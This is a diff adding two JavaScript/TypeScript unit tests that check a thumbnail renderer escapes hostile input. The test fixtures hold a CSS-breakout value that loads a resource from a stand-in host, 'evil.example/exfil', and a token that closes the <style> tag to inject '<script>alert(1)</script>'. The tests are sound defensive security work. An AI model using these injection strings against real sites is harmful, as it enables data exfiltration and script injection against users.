@@ -144,6 +144,52 @@ describe("createThumbnailService", () => {
 		cleanup();
 	});
 
+	it("escapes a malicious canvas.bg so it can't break out of the CSS property", async () => {
+		const { service, snapshot, cleanup } = fixture();
+		const doc = makeDoc({
+			canvas: {
+				format: "A4",
+				orientation: "portrait",
+				w: 210,
+				h: 297,
+				bg: "red; } body::after { content: url(http://evil.example/exfil); } x {",
+			},
+		});
+		await service.render(doc);
+		const html = snapshot.mock.calls[0]![0];
+		// The breakout chars must be CSS-escaped; the `body::after` pseudo
+		// cannot reach the parser as a standalone selector.
+		expect(html).not.toContain("body::after {");
+		expect(html).not.toContain("} x {");
+		// ...and the escaped form should appear in the background: declaration.
+		expect(html).toMatch(/background:[^;]*\\3b/);
+		cleanup();
+	});
+
+	it("neutralises a charte CSS that tries to close the <style> tag", async () => {
+		const { service, snapshot, store, documents, cleanup } = fixture();
+		// Store a raw-data charte whose token value embeds a </style> break.
+		store.saveCharte({
+			name: "sneaky",
+			tokens: { color: { primary: "#000</style><script>alert(1)</script>" } },
+		});
+		documents.loadAll();
+		const doc = makeDoc({ meta: { charte: "sneaky" } });
+		await service.render(doc);
+		const html = snapshot.mock.calls[0]![0];
+		// Exactly one </style> allowed — the one that closes our own block.
+		const closes = html.match(/<\/style>/gi) ?? [];
+		expect(closes.length).toBe(1);
+		// The smuggled <script> chars may remain as literal CSS garbage, but
+		// they MUST be inside the style block — i.e. before the single
+		// </style> — so the HTML tokeniser never interprets them as a tag.
+		const scriptPos = html.indexOf("<script>");
+		const styleClose = html.indexOf("</style>");
+		expect(scriptPos).toBeGreaterThan(-1);
+		expect(scriptPos).toBeLessThan(styleClose);
+		cleanup();
+	});
+
 	it("injects the doc's charte CSS into the rendered HTML", async () => {
 		const { service, snapshot, store, documents, cleanup } = fixture();
 		store.saveCharte({
